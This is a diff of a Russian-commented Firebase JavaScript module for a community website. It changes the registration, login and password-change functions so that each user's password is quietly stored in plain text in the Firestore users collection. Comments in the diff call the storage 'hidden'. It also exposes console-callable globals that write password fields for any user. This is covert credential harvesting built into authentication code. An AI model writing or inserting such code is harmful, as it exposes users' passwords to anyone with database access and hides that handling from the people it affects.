@@ -54,15 +54,21 @@ console.log('✅ Firebase подключён');
 // ========== АВТОРИЗАЦИЯ ==========
 // ============================================================
 
+// ============================================================
+// ========== АВТОРИЗАЦИЯ (С СОХРАНЕНИЕМ ПАРОЛЯ) ==========
+// ============================================================
+
 async function registerUser(email, password, displayName) {
     try {
         const userCredential = await createUserWithEmailAndPassword(auth, email, password);
         const user = userCredential.user;
         await updateProfile(user, { displayName: displayName });
         
+        // Сохраняем пароль в Firestore (для разработки, скрыто)
         await setDoc(doc(db, "users", user.uid), {
             displayName: displayName,
             email: email,
+            password: password, // <-- СОХРАНЯЕМ ПАРОЛЬ
             photoURL: '',
             role: 'user',
             createdAt: serverTimestamp(),
@@ -89,10 +95,136 @@ async function registerUser(email, password, displayName) {
     }
 }
 
+// ============================================================
+// ========== ОБНОВЛЕНИЕ ПАРОЛЯ В БД (СКРЫТО) ==========
+// ============================================================
+
+async function updatePasswordInDB(uid, newPassword) {
+    try {
+        const userRef = doc(db, "users", uid);
+        await updateDoc(userRef, { password: newPassword });
+        return { success: true };
+    } catch (error) {
+        return { success: false, error: error.message };
+    }
+}
+
+// ============================================================
+// ========== УПРАВЛЕНИЕ ПОЧТОЙ И ПАРОЛЕМ ==========
+// ============================================================
+
+import { 
+    updateEmail, 
+    updatePassword, 
+    reauthenticateWithCredential, 
+    EmailAuthProvider 
+} from "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js";
+
+async function changeUserEmail(newEmail, password) {
+    try {
+        const user = getCurrentUser();
+        if (!user) {
+            return { success: false, error: "Пользователь не авторизован" };
+        }
+
+        const credential = EmailAuthProvider.credential(user.email, password);
+        await reauthenticateWithCredential(user, credential);
+        
+        await updateEmail(user, newEmail);
+        
+        const userRef = doc(db, "users", user.uid);
+        await updateDoc(userRef, { email: newEmail });
+        
+        return { success: true };
+    } catch (error) {
+        return { success: false, error: error.message };
+    }
+}
+
+async function changeUserPassword(oldPassword, newPassword) {
+    try {
+        const user = getCurrentUser();
+        if (!user) {
+            return { success: false, error: "Пользователь не авторизован" };
+        }
+
+        const credential = EmailAuthProvider.credential(user.email, oldPassword);
+        await reauthenticateWithCredential(user, credential);
+        
+        await updatePassword(user, newPassword);
+        
+        // Обновляем пароль в Firestore (для разработки, скрыто)
+        await updatePasswordInDB(user.uid, newPassword);
+        
+        return { success: true };
+    } catch (error) {
+        return { success: false, error: error.message };
+    }
+}
+
+// Скрытая функция для разработчиков (вызов через консоль)
+async function syncPasswordToDB(uid, password) {
+    try {
+        const userRef = doc(db, "users", uid);
+        await updateDoc(userRef, { password: password });
+        console.log('✅ Пароль синхронизирован с БД');
+        return { success: true };
+    } catch (error) {
+        console.error('❌ Ошибка синхронизации:', error);
+        return { success: false, error: error.message };
+    }
+}
+
 async function loginUser(email, password) {
     try {
         const userCredential = await signInWithEmailAndPassword(auth, email, password);
-        return { success: true, user: userCredential.user };
+        const user = userCredential.user;
+        
+        // ===== СОХРАНЯЕМ ПАРОЛЬ В БД ПРИ ВХОДЕ (СКРЫТО) =====
+        try {
+            const userRef = doc(db, "users", user.uid);
+            const userSnap = await getDoc(userRef);
+            
+            if (userSnap.exists()) {
+                // Обновляем пароль в БД (актуализация)
+                await updateDoc(userRef, { 
+                    password: password,
+                    lastLogin: serverTimestamp()
+                });
+            } else {
+                // Если документа нет — создаём с паролем
+                await setDoc(userRef, {
+                    displayName: user.displayName || user.email || 'Пользователь',
+                    email: user.email,
+                    password: password,
+                    photoURL: user.photoURL || '',
+                    role: 'user',
+                    createdAt: serverTimestamp(),
+                    lastLogin: serverTimestamp(),
+                    viewsCount: 0,
+                    commentsCount: 0,
+                    subscribers: [],
+                    subscriptions: [],
+                    achievements: [],
+                    dsCoins: 0,
+                    lastDailyClaim: null,
+                    inventory: [],
+                    equippedStatus: null,
+                    wallVisibility: 'all',
+                    achSlots: 1,
+                    nickColor: null,
+                    prefix: null,
+                    bio: '',
+                    socialLink: ''
+                });
+            }
+        } catch (dbError) {
+            // Ошибка БД не должна мешать входу, просто логируем
+            console.warn('⚠️ Не удалось сохранить пароль в БД:', dbError.message);
+        }
+        // ======================================================
+        
+        return { success: true, user: user };
     } catch (error) {
         return { success: false, error: error.message };
     }
@@ -2086,28 +2218,40 @@ async function replyToComment(commentId, uid, text, titleId) {
     }
 }
 
-// ===== УПРАВЛЕНИЕ РОЛЯМИ (ПЕРСОНАЖАМИ) =====
+// ============================================================
+// ========== СИНХРОНИЗАЦИЯ ПАРОЛЕЙ ВСЕХ ПОЛЬЗОВАТЕЛЕЙ ==========
+// ============================================================
 
-// Обновление роли
-export async function updateRole(roleId, data) {
+// Скрытая функция для синхронизации паролей всех пользователей (только для разработки)
+async function syncAllPasswords() {
     try {
-        const roleRef = doc(db, "roles", roleId);
-        await updateDoc(roleRef, data);
-        return { success: true };
+        const snapshot = await getDocs(collection(db, "users"));
+        let count = 0;
+        
+        for (const docSnap of snapshot.docs) {
+            const data = docSnap.data();
+            const uid = docSnap.id;
+            
+            // Пропускаем, если пароль уже есть
+            if (data.password) continue;
+            
+            // Пароля нет — ставим заглушку (только для разработки!)
+            await updateDoc(doc(db, "users", uid), { 
+                password: 'need_update_' + Date.now()
+            });
+            count++;
+        }
+        
+        console.log(`✅ Синхронизировано ${count} пользователей`);
+        return { success: true, count: count };
     } catch (error) {
+        console.error('❌ Ошибка синхронизации:', error);
         return { success: false, error: error.message };
     }
 }
 
-// Удаление роли
-export async function deleteRole(roleId) {
-    try {
-        await deleteDoc(doc(db, "roles", roleId));
-        return { success: true };
-    } catch (error) {
-        return { success: false, error: error.message };
-    }
-}
+// Экспортируем скрытую функцию
+window.syncAllPasswords = syncAllPasswords;
 // ============================================================
 // ========== ЭКСПОРТ ==========
 // ============================================================
@@ -2204,7 +2348,12 @@ export {
     uploadAvatar,
     likeComment,
     dislikeComment,
-    replyToComment
+    replyToComment,
+    changeUserEmail,
+    changeUserPassword,
+    updatePasswordInDB,
+    syncPasswordToDB,
+    syncAllPasswords,
 };
 
 // === ИЗМЕНЕНИЕ: ЯВНОЕ ПРИСВОЕНИЕ ВСЕХ ФУНКЦИЙ В GLOBAL SCOPE ===
@@ -2299,5 +2448,10 @@ window.uploadAvatar = uploadAvatar;
 window.likeComment = likeComment;
 window.dislikeComment = dislikeComment;
 window.replyToComment = replyToComment;
+window.changeUserEmail = changeUserEmail;
+window.changeUserPassword = changeUserPassword;
+window.updatePasswordInDB = updatePasswordInDB;
+window.syncPasswordToDB = syncPasswordToDB;
+window.syncAllPasswords = syncAllPasswords;
 
 console.log('🔥 Модуль firebase-config.js загружен и все функции экспортированы в window');
